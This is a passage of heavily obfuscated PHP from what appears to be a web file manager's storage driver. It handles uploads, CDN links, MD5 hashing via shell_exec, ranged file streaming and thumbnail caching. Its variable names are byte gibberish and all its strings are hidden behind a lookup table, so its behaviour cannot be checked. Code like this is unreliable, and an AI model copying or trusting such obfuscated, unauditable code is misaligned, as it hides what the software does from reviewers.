$ëøî¯Úñ[$·ş¦ŸãÙ[90]][$·ş¦ŸãÙ[88]]; } else { if (substr($ëøî¯Úñ[$·ş¦ŸãÙ[87]], 0, strlen($¨şâ”Êä)) == $¨şâ”Êä) { $¦Ğ†­Š…[$·ş¦ŸãÙ[87]] = substr($ëøî¯Úñ[$·ş¦ŸãÙ[87]], strlen($¨şâ”Êä)); } } $øÃáœù× = $ëøî¯Úñ[$·ş¦ŸãÙ[78]] ? $·ş¦ŸãÙ[8] : $·ş¦ŸãÙ[12]; $¦Ğ†­Š…[$·ş¦ŸãÙ[89]] = rtrim($¦Ğ†­Š…[$·ş¦ŸãÙ[89]], $·ş¦ŸãÙ[8]) . $øÃáœù×; $¦Ğ†­Š…[$·ş¦ŸãÙ[87]] = $·ş¦ŸãÙ[8] . trim($¦Ğ†­Š…[$·ş¦ŸãÙ[87]], $·ş¦ŸãÙ[8]) . $øÃáœù×; if (!$§Ó§–ıÀ) { $»«ˆ¢¦… = explode($·ş¦ŸãÙ[8], trim($¦Ğ†­Š…[$·ş¦ŸãÙ[87]], $·ş¦ŸãÙ[8])); $¦Ğ†­Š…[$·ş¦ŸãÙ[87]] = $·ş¦ŸãÙ[8] . implode($·ş¦ŸãÙ[8], array_slice($»«ˆ¢¦…, 1)) . $øÃáœù×; } $¬Úßà¢ä[] = $¦Ğ†­Š…; } return array_sort_by($¬Úßà¢ä, $·ş¦ŸãÙ[87]); } public function upload($©Á®…¥, $ÙıÎ½”ü, $«Öâß±ó = false, $ÓÑ¦×ÊÂ = REPEAT_REPLACE) { } public function uploadFileByID($×­ÓŠ á, $ú¶’¾, $§ª³¸‘Ÿ) { } public function uploadFileByPath($¯ª†ã , $˜ÛŞŠã€, $û ¿•·Î = array()) { } public function isUploadServer() { $î¡ñÑ¼ =& $_SERVER[©—Ò»ÅĞ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $î¡ñÑ¼[91]) { return !0; } return $GLOBALS[$î¡ñÑ¼[6]][$î¡ñÑ¼[92]][$î¡ñÑ¼[93]]; } public function isFileOutServer() { $õÉÒğˆÇ =& $_SERVER[©—Ò»ÅĞ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $õÉÒğˆÇ[91]) { return !0; } return $GLOBALS[$õÉÒğˆÇ[6]][$õÉÒğˆÇ[92]][$õÉÒğˆÇ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($üÁÑò÷á) { $ŞĞÙ„Œã =& $_SERVER[©—Ò»ÅĞ]; if (!$this->isCdnHost()) { return $üÁÑò÷á; } return str_replace(trim(get_url_root($üÁÑò÷á), $ŞĞÙ„Œã[8]), trim($this->cdnHost, $ŞĞÙ„Œã[8]), $üÁÑò÷á); } public function uploadLink($‚šÜÕû, $…«‚¤¹ = 0) { $“«µ‚ıÄ =& $_SERVER[©—Ò»ÅĞ]; if ($this->isUploadServer()) { return; } $©€„óİ = $this->getType(); if (!in_array($©€„óİ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Èïà±ª  = 1024 * 1024 * 10; $—Û’©°± = (!$…«‚¤¹ ? 1 : ceil($…«‚¤¹ / pow(1024, 3))) * 3600 * 4; if ($…«‚¤¹ <= $Èïà±ª ) { $ã§ÁòĞÍ = $this->uploadFormData($‚šÜÕû, $—Û’©°±); } else { $ã§ÁòĞÍ = $this->uploadMultiData($‚šÜÕû, $—Û’©°±); } if ($ã§ÁòĞÍ) { $ã§ÁòĞÍ[$“«µ‚ıÄ[95]] = $‚šÜÕû; $ã§ÁòĞÍ[$“«µ‚ıÄ[96]] = $©€„óİ; } return $ã§ÁòĞÍ; } public function uploadFormData($×İâÈ²«, $‚×šÜøÀ = 3600) { } public function uploadMultiData($« æ¯ã, $áùÚİ™ = 3600) { } public function multiUploadFormData($Œ¶÷âùÇ, $½·Åƒï¶ = 3600) { return $this->uploadMultiData($Œ¶÷âùÇ, $½·Åƒï¶); } public function download($İÅúŸ‹û, $Ü Ï¢) { } public function ext($âÎÀ¯»ö) { return get_path_ext($âÎÀ¯»ö); } public function pathThis($İ»¸Ì) { $˜“º¸—Ù =& $_SERVER[©—Ò»ÅĞ]; $İ»¸Ì = str_replace($˜“º¸—Ù[97], $˜“º¸—Ù[8], rtrim($İ»¸Ì, $˜“º¸—Ù[8])); $Öë¨¶¨¹ = strrpos($İ»¸Ì, $˜“º¸—Ù[8]); if ($Öë¨¶¨¹ === !1) { return $İ»¸Ì; } return substr($İ»¸Ì, $Öë¨¶¨¹ + 1); } public function pathFather($¼Àñ•§») { $Ë­ıœã =& $_SERVER[©—Ò»ÅĞ]; $¼Àñ•§» = str_replace($Ë­ıœã[97], $Ë­ıœã[8], rtrim($¼Àñ•§», $Ë­ıœã[8])); $èÎºªÛÂ = strrpos($¼Àñ•§», $Ë­ıœã[8]); if ($èÎºªÛÂ === !1) { return $Ë­ıœã[12]; } return substr($¼Àñ•§», 0, $èÎºªÛÂ + 1); } public function hashSimple($Õöêï³ï) { $óç½œº =& $_SERVER[©—Ò»ÅĞ]; if (!$Õöêï³ï) { return md5($óç½œº[12]); } $ë®À•Ú = $this->size($Õöêï³ï); $æúèñ¥Æ = 200; $¾¤ùÈ°Ğ = 50; if ($ë®À•Ú <= $æúèñ¥Æ * $¾¤ùÈ°Ğ) { return $this->hashMd5($Õöêï³ï) . $ë®À•Ú; } $¨çí©Š = intval($ë®À•Ú / $¾¤ùÈ°Ğ); $»õŸĞ¿— = $óç½œº[12]; for ($Éœ÷Ä = 0; $Éœ÷Ä < $¾¤ùÈ°Ğ; $Éœ÷Ä++) { $»õŸĞ¿— .= $this->fileSubstr($Õöêï³ï, $¨çí©Š * $Éœ÷Ä, $æúèñ¥Æ); } $»õŸĞ¿— .= $this->fileSubstr($Õöêï³ï, $ë®À•Ú - $æúèñ¥Æ, $æúèñ¥Æ); return md5($»õŸĞ¿—) . $ë®À•Ú; } public static $md5Cache = array(); public function hashMd5($ç„•¯Ó÷) { if (!$ç„•¯Ó÷) { return md5($_SERVER[©—Ò»ÅĞ][12]); } $ç„•¯Ó÷ = $this->iconvSystem($ç„•¯Ó÷); if (isset(self::$md5Cache[$ç„•¯Ó÷])) { return self::$md5Cache[$ç„•¯Ó÷]; } self::$md5Cache[$ç„•¯Ó÷] = $this->hashMd5Shell($ç„•¯Ó÷); if (!self::$md5Cache[$ç„•¯Ó÷]) { self::$md5Cache[$ç„•¯Ó÷] = @md5_file($ç„•¯Ó÷); } return self::$md5Cache[$ç„•¯Ó÷]; } private function hashMd5Shell($Â¸Ã‹Ğà) { $Ş³ÃĞÉ =& $_SERVER[©—Ò»ÅĞ]; if (!$Â¸Ã‹Ğà) { return md5($Ş³ÃĞÉ[12]); } if (!function_exists($Ş³ÃĞÉ[98])) { return !1; } $ÓÉš˜òå = array($Ş³ÃĞÉ[99], $Ş³ÃĞÉ[100]); $…®ı³êç = Cache::get($Ş³ÃĞÉ[101]); if (!$…®ı³êç) { $é—®Ê¾î = BASIC_PATH . $Ş³ÃĞÉ[102]; $ÈÒÄóü€ = md5_file($é—®Ê¾î); $…®ı³êç = $Ş³ÃĞÉ[103]; foreach ($ÓÉš˜òå as $ÆÒøÏ”Å) { $˜©°ç…ì = shell_exec($ÆÒøÏ”Å . $Ş³ÃĞÉ[53] . escapeShell($é—®Ê¾î)); if ($˜©°ç…ì && substr(trim($˜©°ç…ì), 0, 32) == $ÈÒÄóü€) { $…®ı³êç = $ÆÒøÏ”Å; break; } } Cache::set($Ş³ÃĞÉ[101], $…®ı³êç, 3600); } if ($…®ı³êç == $Ş³ÃĞÉ[103]) { return !1; } $˜©°ç…ì = shell_exec($…®ı³êç . $Ş³ÃĞÉ[53] . escapeShell($Â¸Ã‹Ğà)); $˜©°ç…ì = str_replace($Ş³ÃĞÉ[104], $Ş³ÃĞÉ[12], $˜©°ç…ì); return substr($˜©°ç…ì, 0, 32); } public function link($ÒŒÓ·›) { return $ÒŒÓ·›; } public function fileOut($Â¦·ì¢ , $éÎÚÖ‰ï = false, $æ”¡£Ç´ = false, $·˜’ƒŸ = '') { $ÂÓ’–Š™ =& $_SERVER[©—Ò»ÅĞ]; $this->cacheMethod(null, null); if (!$Â¦·ì¢  || !$this->exist($Â¦·ì¢ )) { show_json(LNG($ÂÓ’–Š™[105]), !1, $æ”¡£Ç´); } $ë‰³ıÂ¼ = $this->getType() == $ÂÓ’–Š™[106]; $ù¥Öå¾ = $GLOBALS[$ÂÓ’–Š™[6]][$ÂÓ’–Š™[92]][$ÂÓ’–Š™[107]][$ÂÓ’–Š™[108]]; $™ÒÆÕı­ = (double) $GLOBALS[$ÂÓ’–Š™[6]][$ÂÓ’–Š™[92]][$ÂÓ’–Š™[107]][$ÂÓ’–Š™[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÜÉêù¥ì = $this->infoFull($Â¦·ì¢ ); $³è š¸è = $ÜÉêù¥ì[$ÂÓ’–Š™[79]]; $ æòá = gmdate($ÂÓ’–Š™[110], $ÜÉêù¥ì[$ÂÓ’–Š™[88]]); $ü‡ê¼ÖÕ = $æ”¡£Ç´ ? $æ”¡£Ç´ : $this->iconvApp($ÜÉêù¥ì[$ÂÓ’–Š™[32]]); $ÄÂ¬ç«ï = 0; $ô‹÷Çê = $³è š¸è - 1; $¸Æè¯Ìõ = $this->ext($ü‡ê¼ÖÕ); if (in_array($¸Æè¯Ìõ, array($ÂÓ’–Š™[111], $ÂÓ’–Š™[112], $ÂÓ’–Š™[113], $ÂÓ’–Š™[114]))) { $¸Æè¯Ìõ = $ÂÓ’–Š™[115]; } if (in_array($¸Æè¯Ìõ, array($ÂÓ’–Š™[116]))) { $¸Æè¯Ìõ = $ÂÓ’–Š™[117]; } if (!$·˜’ƒŸ) { $·˜’ƒŸ = md5($ æòá . $³è š¸è); } $·˜’ƒŸ = $ÂÓ’–Š™[118] . $·˜’ƒŸ . $ÂÓ’–Š™[118]; $°šüŞ§¿ = get_file_mime($¸Æè¯Ìõ); $æ“£ƒ‚– = !0; $æ“£ƒ‚– = isset($_GET[$ÂÓ’–Š™[119]]) ? !1 : !0; if ($éÎÚÖ‰ï === !1 && !mime_support($°šüŞ§¿)) { $°šüŞ§¿ = $ÂÓ’–Š™[120]; } header($ÂÓ’–Š™[121]); header($ÂÓ’–Š™[122] . $°šüŞ§¿); $®°ËÂÖ = rawurlencode($ü‡ê¼ÖÕ); $®°ËÂÖ = $ÂÓ’–Š™[118] . $®°ËÂÖ . $ÂÓ’–Š™[123] . $®°ËÂÖ; if ($éÎÚÖ‰ï) { header($ÂÓ’–Š™[124]); header($ÂÓ’–Š™[125] . $®°ËÂÖ); } else { if ($æ“£ƒ‚–) { header($ÂÓ’–Š™[126] . $®°ËÂÖ); } } $œ¶ÀÊ¶Ã = 3600 * 24 * 30; header($ÂÓ’–Š™[127]); header($ÂÓ’–Š™[128]); header($ÂÓ’–Š™[129] . $œ¶ÀÊ¶Ã); header($ÂÓ’–Š™[130] . gmdate($ÂÓ’–Š™[110], time() + $œ¶ÀÊ¶Ã) . $ÂÓ’–Š™[131]); if (isset($_SERVER[$ÂÓ’–Š™[132]]) && strtotime($_SERVER[$ÂÓ’–Š™[132]]) == $ÜÉêù¥ì[$ÂÓ’–Š™[88]]) { header($ÂÓ’–Š™[133], !0, 304); die; } if (isset($_SERVER[$ÂÓ’–Š™[134]]) && $_SERVER[$ÂÓ’–Š™[134]] == $·˜’ƒŸ) { header($ÂÓ’–Š™[135] . $·˜’ƒŸ, !0, 304); die; } header($ÂÓ’–Š™[135] . $·˜’ƒŸ); header($ÂÓ’–Š™[136] . $ æòá . $ÂÓ’–Š™[131]); header($ÂÓ’–Š™[137] . rawurlencode($ü‡ê¼ÖÕ)); header($ÂÓ’–Š™[138]); header($ÂÓ’–Š™[139] . $³è š¸è); header($ÂÓ’–Š™[140]); Hook::trigger($ÂÓ’–Š™[141], $Â¦·ì¢ , $³è š¸è, $ü‡ê¼ÖÕ, $¸Æè¯Ìõ); if (!$éÎÚÖ‰ï && $¸Æè¯Ìõ == $ÂÓ’–Š™[142]) { if ($³è š¸è > 1024 * 1024 * 10) { die; } $ôß¸Ù‹Û = $this->getContent($Â¦·ì¢ ); $ôß¸Ù‹Û = Html::clearSVG($ôß¸Ù‹Û); header($ÂÓ’–Š™[143] . strlen($ôß¸Ù‹Û)); echo $ôß¸Ù‹Û; die; } $¦¼ƒ¥ĞŞ = strtolower($_SERVER[$ÂÓ’–Š™[144]]); if ($ë‰³ıÂ¼ && $¦¼ƒ¥ĞŞ && $ù¥Öå¾) { if (strstr($¦¼ƒ¥ĞŞ, $ÂÓ’–Š™[145])) { header($ÂÓ’–Š™[146] . $Â¦·ì¢ ); } else { if (strstr($¦¼ƒ¥ĞŞ, $ÂÓ’–Š™[147])) { header($ÂÓ’–Š™[148] . $Â¦·ì¢ ); } else { if (strstr($¦¼ƒ¥ĞŞ, $ÂÓ’–Š™[149])) { header($ÂÓ’–Š™[150] . $Â¦·ì¢ ); } } } if ($™ÒÆÕı­) { header($ÂÓ’–Š™[151] . $™ÒÆÕı­); } return; } if (isset($_SERVER[$ÂÓ’–Š™[152]])) { if (preg_match($ÂÓ’–Š™[153], $_SERVER[$ÂÓ’–Š™[152]], $ı£‹ÀÀÚ)) { $ÄÂ¬ç«ï = intval($ı£‹ÀÀÚ[1]); $ÄÂ¬ç«ï = $ÄÂ¬ç«ï <= 0 ? 0 : ($ÄÂ¬ç«ï >= $ô‹÷Çê ? $ô‹÷Çê : $ÄÂ¬ç«ï); if (!empty($ı£‹ÀÀÚ[2])) { $ïÃËûä¸ = intval($ı£‹ÀÀÚ[2]); $ô‹÷Çê = $ïÃËûä¸ < $ÄÂ¬ç«ï ? $ÄÂ¬ç«ï : ($ïÃËûä¸ >= $ô‹÷Çê ? $ô‹÷Çê : $ïÃËûä¸); } } header($ÂÓ’–Š™[154]); header("\103\157\x6e\x74\x65\156\164\x2d\122\x61\156\147\145\x3a\40\142\171\164\145\163\x20{$ÄÂ¬ç«ï}\x2d{$ô‹÷Çê}\x2f" . $³è š¸è); } else { header($ÂÓ’–Š™[155]); } header($ÂÓ’–Š™[156]); header($ÂÓ’–Š™[157]); $¡¸‚ºÄ‚ = !0; if ($_SERVER[$ÂÓ’–Š™[158]] == $ÂÓ’–Š™[159] && $³è š¸è > 1204 * 1024 * 1024 * 2) { $¡¸‚ºÄ‚ = !1; } if ($¡¸‚ºÄ‚) { header($ÂÓ’–Š™[160] . ($ô‹÷Çê - $ÄÂ¬ç«ï + 1)); } if ($_SERVER[$ÂÓ’–Š™[161]] == $ÂÓ’–Š™[162]) { return; } $Öæï–´ = array($ÂÓ’–Š™[163] => !1, $ÂÓ’–Š™[164] => $ÄÂ¬ç«ï, $ÂÓ’–Š™[165] => $ô‹÷Çê, $ÂÓ’–Š™[166] => $¸Æè¯Ìõ, $ÂÓ’–Š™[167] => $ÜÉêù¥ì, $ÂÓ’–Š™[168] => $ÂÓ’–Š™[12], $ÂÓ’–Š™[169] => 0); $Öæï–´ = Hook::filter($ÂÓ’–Š™[170], $Öæï–´); $š³–¡™ = 1024 * 300; $››ûóÃ« = 0; if ($™ÒÆÕı­) { $››ûóÃ« = intval(1000 * 1000 * ($š³–¡™ / $™ÒÆÕı­)); } while ($ÄÂ¬ç«ï <= $ô‹÷Çê) { $õİ§£“ª = timeFloat(); check_abort(); $„Ê«„š = $ô‹÷Çê - $ÄÂ¬ç«ï + 1; if ($„Ê«„š <= $š³–¡™) { $š³–¡™ = $„Ê«„š; } $ôß¸Ù‹Û = $this->fileSubstr($Â¦·ì¢ , $ÄÂ¬ç«ï, $š³–¡™); if ($Öæï–´[$ÂÓ’–Š™[163]]) { $Öæï–´[$ÂÓ’–Š™[168]] = $ôß¸Ù‹Û; $Öæï–´[$ÂÓ’–Š™[169]] = $ÄÂ¬ç«ï; $Öæï–´ = Hook::filter($ÂÓ’–Š™[171], $Öæï–´); $ôß¸Ù‹Û = $Öæï–´[$ÂÓ’–Š™[168]]; } echo $ôß¸Ù‹Û; $ÄÂ¬ç«ï += $š³–¡™; if ($š³–¡™ == $„Ê«„š) { $ÄÂ¬ç«ï = $ô‹÷Çê + 1; } if ($››ûóÃ«) { $¶¾±„À’ = intval(1000 * 1000 * (timeFloat() - $õİ§£“ª)); $æù¢óá´ = $››ûóÃ« - $¶¾±„À’; if ($æù¢óá´ > 5) { usleep($æù¢óá´); } } } } public function fileOutServer($Ìì¶ìæ, $—£©£¹® = false, $Ü‰Ğƒä’ = false, $„¸Éó‚³ = '') { $this->fileOut($Ìì¶ìæ, $—£©£¹®, $Ü‰Ğƒä’, $„¸Éó‚³); } public function fileOutLink($ÃŞ¦½Õ) { header($_SERVER[©—Ò»ÅĞ][172] . $ÃŞ¦½Õ); die; } public function cacheMethod($¯˜·Ø†·, $ì×—óÀ¯, $Ô³èã³ù = null) { $š­æ«Ğ— =& $_SERVER[©—Ò»ÅĞ]; static $±ê­™’Š = array(); $ø¿˜éìº = $ì×—óÀ¯ ? ltrim($this->getPathOuter($ì×—óÀ¯), $š­æ«Ğ—[8]) : $š­æ«Ğ—[12]; $òî”‰‡è = $š­æ«Ğ—[173] . $¯˜·Ø†· . $š­æ«Ğ—[174] . rtrim($ø¿˜éìº, $š­æ«Ğ—[8]); if (is_null($¯˜·Ø†·)) { $±ê­™’Š = array(); return; } if (is_null($ì×—óÀ¯)) { foreach ($±ê­™’Š as $òî”‰‡è => $¿Ÿìé¾´) { if (!strstr($òî”‰‡è, $š­æ«Ğ—[173] . $¯˜·Ø†· . $š­æ«Ğ—[175])) { continue; } unset($±ê­™’Š[$òî”‰‡è]); } return; } if ($Ô³èã³ù === $š­æ«Ğ—[176]) { unset($±ê­™’Š[$òî”‰‡è]); return; } if (!is_null($Ô³èã³ù)) { $±ê­™’Š[$òî”‰‡è] = $Ô³èã³ù; return; } $¡Ìœö¢ı = isset($±ê­™’Š[$òî”‰‡è]) ? $±ê­™’Š[$òî”‰‡è] : null; if (!is_null($¡Ìœö¢ı)) { return $¡Ìœö¢ı; } $¡Ìœö¢ı = $this->{$¯˜·Ø†·}($ì×—óÀ¯); $±ê­™’Š[$òî”‰‡è] = $¡Ìœö¢ı; return $¡Ìœö¢ı; } public function cacheMethodInfoSet($ÌÉì×Áá, $¯ëÊëÇ‚, $èòæµµ» = false) { $Œ†ìÌ¶Á =& $_SERVER[©—Ò»ÅĞ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Œ†ìÌ¶Á[177], $ÌÉì×Áá, $¯ëÊëÇ‚); $this->cacheMethod($Œ†ìÌ¶Á[178], $ÌÉì×Áá, $¯ëÊëÇ‚ ? !1 : !0); if (is_array($èòæµµ»)) { $this->cacheMethod($Œ†ìÌ¶Á[179], $ÌÉì×Áá, $èòæµµ»); } } public function fileOutImage($Ô¯¬¬ è, $šÎê¾âÀ = 250) { $Ó“ÑãĞ =& $_SERVER[©—Ò»ÅĞ]; set_timeout(); if (substr($Ô¯¬¬ è, 0, 4) == $Ó“ÑãĞ[149]) { $this->fileOutLink($Ô¯¬¬ è); } $ÄÔÖ¢üÁ = $this->info($Ô¯¬¬ è); $®Û´ÉìÈ = !1; $›¸ÌÏÛÏ = isset($GLOBALS[$Ó“ÑãĞ[180]]) ? $GLOBALS[$Ó“ÑãĞ[180]] : array(); if ($›¸ÌÏÛÏ && $›¸ÌÏÛÏ[$Ó“ÑãĞ[181]] == $ÄÔÖ¢üÁ[$Ó“ÑãĞ[87]]) { $ÄÔÖ¢üÁ = $›¸ÌÏÛÏ; $•À¦ÎÌ = $ÄÔÖ¢üÁ[$Ó“ÑãĞ[182]]; if ($•À¦ÎÌ && isset($•À¦ÎÌ[$Ó“ÑãĞ[183]])) { if ($•À¦ÎÌ[$Ó“ÑãĞ[183]] <= $šÎê¾âÀ && $•À¦ÎÌ[$Ó“ÑãĞ[184]] <= $šÎê¾âÀ) { $®Û´ÉìÈ = !0; } } } if ($ÄÔÖ¢üÁ[$Ó“ÑãĞ[79]] <= 1024 * 50 || $®Û´ÉìÈ || !function_exists($Ó“ÑãĞ[185]) || $ÄÔÖ¢üÁ[$Ó“ÑãĞ[166]] == $Ó“ÑãĞ[186]) { return $this->fileOut($Ô¯¬¬ è, !1, $ÄÔÖ¢üÁ[$Ó“ÑãĞ[32]]); } $ı‘ÊØÛ‘ = kodIO::hashPath($ÄÔÖ¢üÁ); $ÇøùÏÉÙ = "\143\157\x76\x65\x72\137{$ı‘ÊØÛ‘}\137{$šÎê¾âÀ}\x2e\x70\156\x67"; $©…ÙáŞ˜ = IO_PATH_SYSTEM_TEMP . $Ó“ÑãĞ[187]; $ã¸ó® = IO::infoFullSimple($©…ÙáŞ˜); $æëíéƒ = $ã¸ó® && is_array($ã¸ó®) ? $ã¸ó®[$Ó“ÑãĞ[87]] : $Ó“ÑãĞ[12]; if (!$æëíéƒ) { $æëíéƒ = IO::mkdir($©…ÙáŞ˜); } if ($ÄÔÖ¢üÁ[$Ó“ÑãĞ[188]] == $Ó“ÑãĞ[189] && isset($ÄÔÖ¢üÁ[$Ó“ÑãĞ[190]]) && $ÄÔÖ¢üÁ[$Ó“ÑãĞ[190]] == kodIO::sourceID($æëíéƒ)) { $áÚÔòİ = $ÄÔÖ¢üÁ[$Ó“ÑãĞ[191]]; if ($šÎê¾âÀ <= 500) { $¾‚ûÈ°Ã = preg_replace($Ó“ÑãĞ[192], $Ó“ÑãĞ[193], $ÄÔÖ¢üÁ[$Ó“ÑãĞ[32]]); $áÚÔòİ = IO::fileNameExist($æëíéƒ, $¾‚ûÈ°Ã); } return IO::fileOut(KodIO::make($áÚÔòİ), !1, $ÄÔÖ¢üÁ[$Ó“ÑãĞ[32]]); } $àûúƒ¢ = IO::fileNameExist($æëíéƒ, $ÇøùÏÉÙ); if ($àûúƒ¢) { return IO::fileOut(KodIO::make($àûúƒ¢), !1, $ÄÔÖ¢üÁ[$Ó“ÑãĞ[32]]); } if ($šÎê¾âÀ > 1000) { $this->makeImageCover($æëíéƒ, $Ô¯¬¬ è, $ÇøùÏÉÙ, $šÎê¾âÀ); $this->makeImageCover($æëíéƒ, $Ô¯¬¬ è, "\143\x6f\166\145\x72\137{$ı‘ÊØÛ‘}\137\62\65\x30\56\160\156\x67", 250); $àûúƒ¢ = IO::fileNameExist($æëíéƒ, $ÇøùÏÉÙ); if ($àûúƒ¢) { return IO::fileOut(KodIO::make($àûúƒ¢), !1, $ÄÔÖ¢üÁ[$Ó“ÑãĞ[32]]); } die; } if (!kodIO::allowCover($ÄÔÖ¢üÁ)) { return $this->fileOut($Ô¯¬¬ è, !1, $ÄÔÖ¢üÁ[$Ó“ÑãĞ[32]]); } $ ­©ºÅ¾ = Cache::get($ÇøùÏÉÙ); if ($ ­©ºÅ¾ == $Ó“ÑãĞ[194] || $ ­©ºÅ¾ == $Ó“ÑãĞ[195]) { echo $ ­©ºÅ¾; die; } Cache::set($ÇøùÏÉÙ, $Ó“ÑãĞ[195], 60); $ÅûóÉü = array($æëíéƒ, $ÄÔÖ¢üÁ[$Ó“ÑãĞ[87]], $ÇøùÏÉÙ, $šÎê¾âÀ); $Åæ«Ø = $Ó“ÑãĞ[196] . $ÄÔÖ¢üÁ[$Ó“ÑãĞ[79]] . $Ó“ÑãĞ[197] . $ÇøùÏÉÙ . $Ó“ÑãĞ[198] . $ÄÔÖ¢üÁ[$Ó“ÑãĞ[32]] . $Ó“ÑãĞ[199] . $ÄÔÖ¢üÁ[$Ó“ÑãĞ[87]]; TaskQueue::add($Ó“ÑãĞ[200], $ÅûóÉü, $Åæ«Ø, $ÇøùÏÉÙ); } public function makeImageCover($£±ïÀ‡Â, $Ú†Á‹¡Ù, $ğ‡‹°äâ, $öÎñèÜÆ) { $†³›èŠà =& $_SERVER[©—Ò»ÅĞ]; if (IO::fileNameExist($£±ïÀ‡Â, $ğ‡‹°äâ)) { return $†³›èŠà[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $›¹Ûƒİè = $this->getPathOuter($Ú†Á‹¡Ù); $©äàşÓØ = DATA_THUMB . $ğ‡‹°äâ; del_file($©äàşÓØ); $ÁûÛ‘ÍÁ = IO::copy($›¹Ûƒİè, TEMP_FILES, !1, $ğ‡‹°äâ); if (!@file_exists($ÁûÛ‘ÍÁ)) { return $†³›èŠà[202]; } ImageThumb::createThumb($ÁûÛ‘ÍÁ, $©äàşÓØ, $öÎñèÜÆ, $öÎñèÜÆ * 10); if (@file_exists($©äàşÓØ)) { Cache::remove($ğ‡‹°äâ); return IO::move($©äàşÓØ, $£±ïÀ‡Â); } Cache::set($ğ‡‹°äâ, $†³›èŠà[194], 600); del_file($©äàşÓØ); return $†³›èŠà[203] . $ÁûÛ‘ÍÁ . $†³›èŠà[74]; } public function fileOutImageServer($­¹ªÌŠ, $¤²²â¿ = 250) { $this->fileOutImage($­¹ªÌŠ, $¤²²â¿); } public function fileNameAuto($í‘×¡§ì, $¼ğ¿ßˆ, $éãÀåÜõ = REPEAT_RENAME, $ÁÆÎı˜ú = false) { $Çç™ãÏ =& $_SERVER[©—Ò»ÅĞ]; $ëñÖüûà = $í‘×¡§ì === $Çç™ãÏ[12] ? $¼ğ¿ßˆ : rtrim($í‘×¡§ì, $Çç™ãÏ[8]) . $Çç™ãÏ[8] . $¼ğ¿ßˆ; if ($éãÀåÜõ == REPEAT_REPLACE || !$this->exist($ëñÖüûà) || $ÁÆÎı˜ú && $éãÀåÜõ != REPEAT_RENAME_FOLDER) { return $¼ğ¿ßˆ; } if ($éãÀåÜõ == REPEAT_SKIP) { return !1; } $ÂµÍÍØ = $Çç™ãÏ[10] . get_path_ext($¼ğ¿ßˆ); $ÂµÍÍØ = $ÂµÍÍØ == $Çç™ãÏ[10] || $ÁÆÎı˜ú ? $Çç™ãÏ[12] : $ÂµÍÍØ; $­“ˆÊı® = 1; $Ë»§½§ = substr($¼ğ¿ßˆ, 0, strlen($¼ğ¿ßˆ) - strlen($ÂµÍÍØ)); $ºŒ©¾è = $Ë»§½§ . "\x28{$­“ˆÊı®}\51{$ÂµÍÍØ}"; while ($this->exist(rtrim($í‘×¡§ì, $Çç™ãÏ[8]) . $Çç™ãÏ[8] . $ºŒ©¾è)) { $ºŒ©¾è = $Ë»§½§ . "\50{$­“ˆÊı®}\51{$ÂµÍÍØ}"; $­“ˆÊı®++; } return $ºŒ©¾è; } private function fileNameAutoList($ÅÈäªÒ, $æğ†®Ş…, $Õ£˜£© = false) { $“ÔÕİà× =& $_SERVER[©—Ò»ÅĞ]; $ñõùâÄÈ = $this->listPath($ÅÈäªÒ, !0); $ñõùâÄÈ = array_merge($ñõùâÄÈ[$“ÔÕİà×[85]], $ñõùâÄÈ[$“ÔÕİà×[86]]); $òµ¡Ë·« = array_to_keyvalue($ñõùâÄÈ, $“ÔÕİà×[12], $“ÔÕİà×[32]); $æÜæì´” = $“ÔÕİà×[10] . get_path_ext($æğ†®Ş…); $æÜæì´” = $æÜæì´” == $“ÔÕİà×[10] || $Õ£˜£© ? $“ÔÕİà×[12] : $æÜæì´”; $Ã‹•¯Èì = substr($æğ†®Ş…, 0, strlen($æğ†®Ş…) - strlen($æÜæì´”)); $Ì—ÁÉÔ = $Ã‹•¯Èì . "\x28\x30\51{$æÜæì´”}"; for ($ŸÂ™¢à = 1; $ŸÂ™¢à <= count($òµ¡Ë·«) + 1; $ŸÂ™¢à++) { $Ì—ÁÉÔ = $Ã‹•¯Èì . "\50{$ŸÂ™¢à}\x29{$æÜæì´”}"; if (!in_array_not_case($Ì—ÁÉÔ, $òµ¡Ë·«)) { return $Ì—ÁÉÔ; } } return $Ì—ÁÉÔ; } public function listAllFiles($ñè£µ›‚, $ˆ  Èó“) { $§ü¶Ò»Š =& $_SERVER[©—Ò»ÅĞ]; if (empty($ˆ  Èó“)) { return array(); } $ûáç¨†š = array_keys($ˆ  Èó“); $‡ìÍÇ¬â = array(); $ñè£µ›‚ = trim($ñè£µ›‚, $§ü¶Ò»Š[8]); foreach ($ˆ  Èó“ as $•òÚôêÊ => $Úâñ–ƒ) { $ŸÖ€Âº = ltrim(substr(trim($•òÚôêÊ, $§ü¶Ò»Š[8]), strlen($ñè£µ›‚)), $§ü¶Ò»Š[8]); if (substr($•òÚôêÊ, -1) == $§ü¶Ò»Š[8]) { $ŸÖ€Âº = rtrim($ŸÖ€Âº, $§ü¶Ò»Š[8]) . $§ü¶Ò»Š[8]; } $‡ìÍÇ¬â = array_merge($‡ìÍÇ¬â, $this->slicePath($ŸÖ€Âº)); } $ºÏœ = array(); foreach (array_unique($‡ìÍÇ¬â) as $ÇËÆ’©Ü) { $È¬Ä›Ş— = array($§ü¶Ò»Š[87] => $this->getPathOuter($§ü¶Ò»Š[8] . $ñè£µ›‚ . $§ü¶Ò»Š[8] . $ÇËÆ’©Ü), $§ü¶Ò»Š[78] => 1, $§ü¶Ò»Š[79] => 0); if (substr($ÇËÆ’©Ü, -1) != $§ü¶Ò»Š[8]) { $È¬Ä›Ş—[$§ü¶Ò»Š[78]] = 0; $òŞáÒÑÜ = $this->getPath($ñè£µ›‚ . $§ü¶Ò»Š[8] . $ÇËÆ’©Ü); if (isset($ˆ  Èó“[$òŞáÒÑÜ])) { $ç’Ÿê = $ˆ  Èó“[$òŞáÒÑÜ]; if (isset($ç’Ÿê[$§ü¶Ò»Š[79]])) { $È¬Ä›Ş—[$§ü¶Ò»Š[79]] = intval($ç’Ÿê[$§ü¶Ò»Š[79]]); } if (isset($ç’Ÿê[$§ü¶Ò»Š[204]])) { 